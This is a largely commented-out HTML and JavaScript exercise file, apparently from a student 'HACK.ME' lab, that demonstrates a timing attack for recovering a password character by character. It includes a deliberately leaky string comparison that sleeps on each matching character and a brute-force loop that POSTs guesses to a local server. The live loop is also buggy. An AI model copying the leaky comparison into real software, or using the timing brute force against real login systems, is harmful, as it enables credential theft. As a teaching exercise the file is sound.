// <!DOCTYPE html>
// <html>

// <head>

// <link rel="stylesheet" href="C:\Users\Yuval\Documents\cyber\HACK.ME\styles\timing.css">

// </head>

// <body >

// <div class="bg">
// <input class="search-input" type="text" id="name" name="name">
		// <button class="search-button" type="button"onclick="timingAttack()">search</button><br>
// <input class="answer" type="text" id="answer" name="answer">
		// <button class="answer-button" type="button"onclick="myAnswer()">submit</button>
// </div>
// </body>



// <script>
// function myAnswer(){
// if (document.getElementById("answer").value=="qwerty")
	// alert("Correct");
// else
	// alert("Incorrect");
// }
let hashmap = new Map()
var pass="";
	for(var i=0;i<100;i++){
		for(var j=33;j<123;j++){
			var ch=String.fromCharCode(j);
			var start_time=Date.now();
			$(document).ready(function() {
	$.ajax({
		url: 'http://127.0.0.1:3000/',
		data:   pass +ch,
		type: 'POST',
		jsonpCallback: 'callback', // this is not relevant to the POST   anymore
		success: function (data) {
			var ret = jQuery.parseJSON(data);
			$('#lblResponse').html(ret.msg);
			console.log('Success: ')
		},
		error: function (xhr, status, error) {
			console.log('Error: ' + error.message);
			$('#lblResponse').html('Error connecting to the server.');

		},
	});
	 });
	 var end=Date.now();
	 var exectime=end-start;
	 if(!hashmap.hasOwnProperty(ch)){
		 hashmap[ch]='';
	 }
	 hashmap[ch]=exectime;
		}
	}
	




// function sleep(delay){
// var start = new Date().getTime();
    // while (new Date().getTime() < start + delay);
// }

// function sleep(delay){
// var start = new Date().getTime();
    // while (new Date().getTime() < start + delay);
// }
// String.prototype.replaceAt = function(index, replacement) {
	// if (index >= this.length) {
		// return this.valueOf();
	// }

	// return this.substring(0, index) + replacement + this.substring(index + 1);
// }

// function strcmp(a, b) {
    // for(var i=0;i<a.length;i++){
		// if(a.charAt(i)==b.charAt(i))
			// sleep(10);
		// else
			// return 0;
	// }
	// return 1;
// }
// function checkpass(chatpassowrd){
// var str="!";
// var password=str.repeat(chatpassowrd.length);
// var max_time=0;
// var x=strcmp(password,chatpassowrd);
// if(x!=1){
	// var temp=password;
	// var s=0;
	// for(var n=0;n<chatpassowrd.length;n++){
		// for(var j=33;j<123;j++){
			// var ch2=String.fromCharCode(j);
			// temp=temp.replaceAt(n,ch2);
			// var start_time=Date.now()
			// strcmp(temp,chatpassowrd);
			// var end=Date.now()
			// var exec=end-start_time;
			
			// if(exec>max_time){
				// max_time=exec;
				// password=password.replaceAt(n,ch2);
				// temp=temp.replaceAt(n,ch2);
				 // s=j;
				// }
				
			
			
			
			// }
			// temp=password;
			
			
			// }
			// alert(password);
			
// }
		
	
	
	
// }
// </script>
// <script>
// function timingAttack(){
	// var SearchTerm = document.getElementById("name").value;
	// var alltext=localStorage.getItem("chatkey");
	// function getSentencesWithWord(word, text) {
	// Search for sentences, insert a pipe, then split on the pipe
	// const sentenceArray = text.replace(/([.?!])\s*(?=[A-Z])/g, "$1|").split("|")

  // Filter our array by checking if each sentence includes the word, then immedietly returns it
	// return sentenceArray.filter(sentence => sentence.includes(word))
// }

// Run a test of our function
	// var allmatches=getSentencesWithWord(SearchTerm,alltext)
	// var is_index=0;
	// var pass="";
	// if(alltext.indexOf(SearchTerm)!=-1){
		// is_index=allmatches[0].indexOf("is")
		// pass=allmatches[0].substring(is_index+3,allmatches[0].length-1);
		// checkpass(pass);
	// }
	
	
// }
// </script>


// </html>






